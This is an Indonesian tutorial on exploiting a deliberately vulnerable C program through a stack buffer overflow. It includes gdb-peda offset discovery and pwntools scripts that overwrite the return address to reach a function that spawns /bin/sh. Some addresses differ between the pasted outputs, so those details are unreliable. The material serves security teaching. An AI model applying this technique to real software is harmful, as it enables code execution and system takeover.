
# Klasik BufferOverflow  32 bit dan 64bit#

[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NO NX ~ -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include<stdio.h>

void hackrich()
{
    printf("Hacked !!!!!\n");
    system("/bin/sh");
}

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

dicompile dengan opsi

```bash
#untuk 32bit tanpa stack-protector Canary, execstack NX, PIE
gcc -g -m32 -fno-stack-protector -z execstack -no-pie -o vuln32 vuln_program.c
#untuk 64bit tanpa stack-protector Canary, execstack NX, PIE
gcc -g -m64 -fno-stack-protector -z execstack -no-pie -o vuln64 vuln_program.c
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

untuk mendapatkan semua fungsi didalam program vuln32 sebagai berikut caranya

```bash
gdb-peda$info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  gets@plt
0x08049050  puts@plt
0x08049060  system@plt
0x08049070  _start
0x080490a0  _dl_relocate_static_pie
0x080490b0  __x86.get_pc_thunk.bx
0x080490c0  deregister_tm_clones
0x08049100  register_tm_clones
0x08049140  __do_global_dtors_aux
0x08049170  frame_dummy
0x08049176  hackrich
0x080491b2  foo
0x080491eb  main
0x08049203  __x86.get_pc_thunk.ax
0x08049208  _fini
```

berikut ini untuk melihat isi perintah assembly dari fungsi main

```bash
gdb-peda$pdisass main
Dump of assembler code for function main:
   0x080491eb <+0>: push   ebp
   0x080491ec <+1>: mov    ebp,esp
   0x080491ee <+3>: and    esp,0xfffffff0
   0x080491f1 <+6>: call   0x8049203 <__x86.get_pc_thunk.ax>
   0x080491f6 <+11>: add    eax,0x2dfe
   0x080491fb <+16>: call   0x80491b2 <foo>
   0x08049200 <+21>: nop
   0x08049201 <+22>: leave  
   0x08049202 <+23>: ret    
End of assembler dump.
```

berikut ini cara untuk melihat isi perintah assembly dari fungsi foo

```bash
gdb-peda$ pdisass foo
Dump of assembler code for function foo:
   0x080491b2 <+0>: push   ebp
   0x080491b3 <+1>: mov    ebp,esp
   0x080491b5 <+3>: push   ebx
   0x080491b6 <+4>: sub    esp,0x34
   0x080491b9 <+7>: call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x080491be <+12>: add    ebx,0x2e36
   0x080491c4 <+18>: sub    esp,0xc
   0x080491c7 <+21>: lea    eax,[ebx-0x1fd7]
   0x080491cd <+27>: push   eax
   0x080491ce <+28>: call   0x8049050 <puts@plt>
   0x080491d3 <+33>: add    esp,0x10
   0x080491d6 <+36>: sub    esp,0xc
   0x080491d9 <+39>: lea    eax,[ebp-0x30]
   0x080491dc <+42>: push   eax
   0x080491dd <+43>: call   0x8049040 <gets@plt>
   0x080491e2 <+48>: add    esp,0x10
   0x080491e5 <+51>: nop
   0x080491e6 <+52>: mov    ebx,DWORD PTR [ebp-0x4]
   0x080491e9 <+55>: leave  
   0x080491ea <+56>: ret    
End of assembler dump.
```

kemudian diset breakpoint pada line 14 atau alamat 0x080491e9

```bash
gdb-peda$ b *0x080491e9
Breakpoint 1 at 0x80491e9: file vuln_program.c, line 14.
```

untuk membuat inputan random sebanyak 100 karakter dengan pattern create

```bash
gdb-peda$pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

menjalankan aplikasinya 

```bash
gdb-peda$ run
Starting program: ./vuln32 
give me your input :)
[----------------------------------registers-----------------------------------]
EAX: 0xffffd618 --> 0x0 
EBX: 0x804c000 --> 0x804bf14 --> 0x1 
ECX: 0xf7fb6890 --> 0x0 
EDX: 0x17 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0xffffd648 --> 0xffffd658 --> 0x0 
ESP: 0xffffd600 --> 0xffffd618 --> 0x0 
EIP: 0x80491e9 (<foo+43>: call   0x8049030 <gets@plt>)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80491e2 <foo+36>: sub    esp,0xc
   0x80491e5 <foo+39>: lea    eax,[ebp-0x30]
   0x80491e8 <foo+42>: push   eax
=> 0x80491e9 <foo+43>: call   0x8049030 <gets@plt>
   0x80491ee <foo+48>: add    esp,0x10
   0x80491f1 <foo+51>: nop
   0x80491f2 <foo+52>: mov    ebx,DWORD PTR [ebp-0x4]
   0x80491f5 <foo+55>: leave
Guessed arguments:
arg[0]: 0xffffd618 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0xffffd618 --> 0x0 
0004| 0xffffd604 --> 0xf7fb5000 --> 0x1d9d6c 
0008| 0xffffd608 --> 0xf7e0cb39 (add    ebx,0x1a84c7)
0012| 0xffffd60c --> 0x80491ca (<foo+12>: add    ebx,0x2e36)
0016| 0xffffd610 --> 0xf7fb5000 --> 0x1d9d6c 
0020| 0xffffd614 --> 0xf7fb5000 --> 0x1d9d6c 
0024| 0xffffd618 --> 0x0 
0028| 0xffffd61c --> 0xf7e0cc7b (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080491e9 in foo () at vuln_program.c:14
14     gets(buffer);
gdb-peda$
```

kemudian menjalankan next instruksi dengan perintah nexti atau ni
selanjutnya paste hasil dari pattern create tanpa '

```bash
gdb-peda$ ni
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
EAX: 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x804c000 --> 0x804bf14 --> 0x1 
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0xffffd648 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffd600 --> 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x80491ee (<foo+48>: add    esp,0x10)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80491e5 <foo+39>: lea    eax,[ebp-0x30]
   0x80491e8 <foo+42>: push   eax
   0x80491e9 <foo+43>: call   0x8049030 <gets@plt>
=> 0x80491ee <foo+48>: add    esp,0x10
   0x80491f1 <foo+51>: nop
   0x80491f2 <foo+52>: mov    ebx,DWORD PTR [ebp-0x4]
   0x80491f5 <foo+55>: leave  
   0x80491f6 <foo+56>: ret
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd604 --> 0xf7fb5000 --> 0x1d9d6c 
0008| 0xffffd608 --> 0xf7e0cb39 (add    ebx,0x1a84c7)
0012| 0xffffd60c --> 0x80491ca (<foo+12>: add    ebx,0x2e36)
0016| 0xffffd610 --> 0xf7fb5000 --> 0x1d9d6c 
0020| 0xffffd614 --> 0xf7fb5000 --> 0x1d9d6c 
0024| 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd61c ("AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080491ee 14     gets(buffer);
gdb-peda$
```

ketik perintah continue supaya program berjalan sampai akhir

```bash
gdb-peda$ continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd618 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41414641 ('AFAA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd650 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffd650 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd654 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd658 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd65c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd660 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd664 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd668 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd66c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$
```

mencari posisi byte di EBP pada pola yang dibuat menggunakan pattern create saat crash dengan perintah pattern offset

```bash
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```
secara ilustrasi seperti gambar berikut
pola ini diserupakan AAAA untuk 52 bytes
sehingga kita bisa merubah isi dari EIP dengan menuliskan 4 byte setelah 52

![[memory-layout-1.png]]

kemudian coba untuk mengisi EIP dengan BBBB atau 0x42424242 dalam hexa
buat payload di terminal dengan
```bash
$python -c "print b'A'*52+b'BBBB'"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

gunakan sebagai parameter pada aplikasi

```bash
$gdb -q vuln32
Reading symbols from vuln32...done.
gdb-peda$ run
Starting program: /root/You_Tube/Stack_Buffer_Overflow/1/vuln32 
give me your input :)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd618 ('A' <repeats 52 times>, "BBBB")
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd650 --> 0xf7fb5000 --> 0x1d9d6c 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd650 --> 0xf7fb5000 --> 0x1d9d6c 
0004| 0xffffd654 --> 0xf7fb5000 --> 0x1d9d6c 
0008| 0xffffd658 --> 0x0 
0012| 0xffffd65c --> 0xf7df5b41 (<__libc_start_main+241>: add    esp,0x10)
0016| 0xffffd660 --> 0x1 
0020| 0xffffd664 --> 0xffffd6f4 --> 0xffffd81d ("/root/You_Tube/Stack_Buffer_Overflow/1/vuln32")
0024| 0xffffd668 --> 0xffffd6fc --> 0xffffd84b ("SHELL=/bin/bash")
0028| 0xffffd66c --> 0xffffd684 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
```

terlihat diatas EIP terisi dengan 0x42424242

sehingga kita bisa melakukan manipulasi arah next instruksinya ke 0x42424242
tantangan pada program ini adalah apabila kita bisa menjalankan fungsi hackrich.
supaya bisa menjalankannya kita perlu mengarahkan isi EIP ini ke alamat fungsi hackrich. 

untuk mencari alamat dari fungsi hackrich dengan cara sebagai berikut

```bash
gdb-peda$ pdisass hackrich
Dump of assembler code for function hackrich:
   0x08049182 <+0>: push   ebp
   0x08049183 <+1>: mov    ebp,esp
   0x08049185 <+3>: push   ebx
   0x08049186 <+4>: sub    esp,0x4
   0x08049189 <+7>: call   0x80490c0 <__x86.get_pc_thunk.bx>
   0x0804918e <+12>: add    ebx,0x2e72
   0x08049194 <+18>: sub    esp,0xc
   0x08049197 <+21>: lea    eax,[ebx-0x1ff8]
   0x0804919d <+27>: push   eax
   0x0804919e <+28>: call   0x8049040 <puts@plt>
   0x080491a3 <+33>: add    esp,0x10
   0x080491a6 <+36>: sub    esp,0xc
   0x080491a9 <+39>: lea    eax,[ebx-0x1feb]
   0x080491af <+45>: push   eax
   0x080491b0 <+46>: call   0x8049050 <system@plt>
   0x080491b5 <+51>: add    esp,0x10
   0x080491b8 <+54>: nop
   0x080491b9 <+55>: mov    ebx,DWORD PTR [ebp-0x4]
   0x080491bc <+58>: leave  
   0x080491bd <+59>: ret    
End of assembler dump.
```

didapatkan alamat dari hackrich 0x08049182

kemudian dibuat payload 'A' sebanyak 52 + 0x08049182 
karena linux ini adalah little endian maka menulisnya terbalik tetepi menggunakan pwn tools tidak perlu dibalik

```python
from pwn import *

p = process('./vuln32')
print(p.recv())
padding = b'A'*52
ret_address = p32(0x08049182)
p.sendline(padding+ret_address)
print(p.clean())
p.interactive()
```

```bash
$python3 exploit32.py
[+] Starting local process './vuln32': pid 265
b'give me your input :)\n\n'
b'Hacked !!!!!\n'
[*] Switching to interactive mode
```

akhirnya sukses mengeksekusi fungsi hackrich menggunakan bug/vulnerability buffer overflow

## untuk 64 bit

tidak banyak berbeda namun alamatnya semakin panjang

```bash
gdb-peda$ pdisass hackrich
Dump of assembler code for function hackrich:
   0x0000000000401142 <+0>: push   rbp
   0x0000000000401143 <+1>: mov    rbp,rsp
   0x0000000000401146 <+4>: lea    rdi,[rip+0xeb7]        # 0x402004
```

alamat dari hackrich di 0x0000000000401142

mencari total bytes dari buffer sampai EBP

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/You_Tube/Stack_Buffer_Overflow/1/vuln64 
give me your input :)

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe4e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fb4a00 --> 0xfbad2288 
RDX: 0x7ffff7fb68d0 --> 0x0 
RSI: 0x405671 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe4e1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffe518 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x40118d (<foo+39>: ret)
R8 : 0x4056d5 --> 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x246 
R12: 0x401060 (<_start>: xor    ebp,ebp)
R13: 0x7fffffffe600 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401186 <foo+32>: call   0x401050 <gets@plt>
   0x40118b <foo+37>: nop
   0x40118c <foo+38>: leave  
=> 0x40118d <foo+39>: ret    
   0x40118e <main>: push   rbp
   0x40118f <main+1>: mov    rbp,rsp
   0x401192 <main+4>: mov    eax,0x0
   0x401197 <main+9>: call   0x401166 <foo>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe518 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe520 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe528 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe530 ("AJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe538 ("AAKAAgAA6AAL")
0040| 0x7fffffffe540 --> 0x4c414136 ('6AAL')
0048| 0x7fffffffe548 --> 0x40118e (<main>: push   rbp)
0056| 0x7fffffffe550 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040118d in foo () at vuln_program.c:15
15 }
gdb-peda$ pattern offset 0x4147414131414162
4703800084066812258 found at offset: 48
```

sehingga untuk sampai dengan EBP  = 48 bytes + 8 bytes (64 bit) = 56

exploit sebagai berikut

```python
from pwn import *

p = process('./vuln64')
print(p.recv())
padding = b'A'*56
ret_address = p64(0x401146)
p.sendline(padding+ret_address)
print(p.clean())
p.interactive()

```

hasilnya 

```bash
python3 exploit.py 
[+] Starting local process './vuln64': pid 17165
b'give me your input :)\n'
b'\nHacked !!!!!\n'
[*] Switching to interactive mode

```